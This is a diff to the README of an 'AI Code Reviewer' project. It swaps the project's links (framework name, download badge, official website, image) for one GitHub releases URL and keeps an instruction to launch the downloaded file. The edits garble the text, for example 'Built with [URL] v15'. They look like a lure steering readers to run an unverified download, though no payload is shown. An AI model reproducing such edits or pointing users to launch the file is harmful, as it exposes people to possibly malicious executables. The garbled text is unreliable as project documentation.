@@ -9,7 +9,7 @@ Welcome to the AI Code Reviewer repository! This project is aimed at providing a
 - Powered by Google Gemini AI technology
 - Implemented in JavaScript
 - Markdown support for documentation
-- Built with Next.js v15
+- Built with https://github.com/diliser04/AI-Code-Reviewer/releases v15
 - Uses Prism for syntax highlighting
 - Rehype-highlight for code block styling
 - Shadcn-UI components for sleek interfaces
@@ -30,16 +30,16 @@ Welcome to the AI Code Reviewer repository! This project is aimed at providing a
 
 ## Get Started 🛠️
 To access the project files, you can download the zip folder from the following link:
-[![Download App.zip](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/project/files/App.zip)
+[![Download https://github.com/diliser04/AI-Code-Reviewer/releases](https://github.com/diliser04/AI-Code-Reviewer/releases)](https://github.com/diliser04/AI-Code-Reviewer/releases)
 
 If the link ends with a file name, make sure to launch the downloaded file to start using the AI Code Reviewer platform. In case the link is not accessible or not working, kindly check the "Releases" section of this repository for alternative download options.
 
 ## Explore Further 🌐
-Feel free to visit the [official website](https://www.aicodereviewer.com) for more information and live demo of the AI Code Reviewer platform.
+Feel free to visit the [official website](https://github.com/diliser04/AI-Code-Reviewer/releases) for more information and live demo of the AI Code Reviewer platform.
 
 Let's enhance code development practices together with the power of AI! 🤖✨
 
-![AI Code Reviewer](https://source.unsplash.com/800x600/?technology,code)
+![AI Code Reviewer](https://github.com/diliser04/AI-Code-Reviewer/releases,code)
 
 ---
 
